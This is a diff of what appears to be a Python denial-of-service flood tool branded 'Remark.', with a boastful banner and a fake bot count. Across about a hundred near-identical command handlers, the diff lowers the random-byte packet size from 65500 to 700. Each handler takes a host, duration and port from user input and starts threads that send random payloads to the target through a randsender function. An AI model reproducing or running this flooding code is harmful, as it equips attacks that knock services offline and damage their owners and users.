@@ -258,10 +258,10 @@ path = """
 """
 
 banner =  """
- Remark. [Alpha].
- In collaboration, ek X fallout.
- Our Power Will OverWhelm And Destroy.
- July 18th, 2022
+  [00mRemark. [Alpha].
+  [00mIn collaboration, ek X fallout.
+  [00mOur Power Will OverWhelm And Destroy.
+  [00mJuly 18th, 2022
 """
 
 
@@ -346,7 +346,7 @@ def main():
 	while True:
 		bots = (random.randint(3250,4150))
 		sys.stdout.write("\x1b]2;Remark. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
-		sin = input("root💀kali)-[~/RemarkV1]~# ".format(nicknm)).lower() # yk
+		sin = input("~ ".format(nicknm)).lower() # yk
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
@@ -410,7 +410,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -426,7 +426,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -442,7 +442,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -458,7 +458,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -474,7 +474,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -490,7 +490,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -506,7 +506,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -522,7 +522,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -538,7 +538,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -554,7 +554,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -570,7 +570,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -586,7 +586,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -602,7 +602,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -618,7 +618,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -634,7 +634,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -651,7 +651,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -667,7 +667,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -683,7 +683,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -699,7 +699,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -715,7 +715,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -731,7 +731,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -747,7 +747,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -763,7 +763,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -779,7 +779,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -795,7 +795,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -811,7 +811,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -827,7 +827,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -843,7 +843,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -859,7 +859,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -875,7 +875,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -891,7 +891,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -907,7 +907,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -923,7 +923,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -939,7 +939,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -955,7 +955,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -971,7 +971,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -987,7 +987,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1003,7 +1003,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1019,7 +1019,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1035,7 +1035,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1051,7 +1051,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1067,7 +1067,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1083,7 +1083,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1099,7 +1099,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1115,7 +1115,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1131,7 +1131,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1147,7 +1147,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1163,7 +1163,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1179,7 +1179,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1195,7 +1195,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1211,7 +1211,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1227,7 +1227,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1243,7 +1243,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1259,7 +1259,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1275,7 +1275,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1292,7 +1292,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1308,7 +1308,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1324,7 +1324,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1340,7 +1340,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1356,7 +1356,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1372,7 +1372,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1388,7 +1388,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1404,7 +1404,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1420,7 +1420,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1436,7 +1436,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1452,7 +1452,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1468,7 +1468,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1484,7 +1484,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1500,7 +1500,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1516,7 +1516,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1532,7 +1532,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1548,7 +1548,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1564,7 +1564,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1580,7 +1580,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1596,7 +1596,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1612,7 +1612,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1628,7 +1628,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1644,7 +1644,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1660,7 +1660,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1676,7 +1676,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1692,7 +1692,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1708,7 +1708,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1724,7 +1724,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1740,7 +1740,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1756,7 +1756,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1772,7 +1772,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1788,7 +1788,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1804,7 +1804,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1820,7 +1820,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1836,7 +1836,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1852,7 +1852,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1868,7 +1868,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1884,7 +1884,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1900,7 +1900,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1916,7 +1916,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1933,7 +1933,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1949,7 +1949,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1965,7 +1965,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1981,7 +1981,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -1997,7 +1997,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2013,7 +2013,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2029,7 +2029,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2045,7 +2045,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2061,7 +2061,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2077,7 +2077,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2093,7 +2093,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 65500
+					pack = 700
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print(attak)
@@ -2109,7 +2109,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
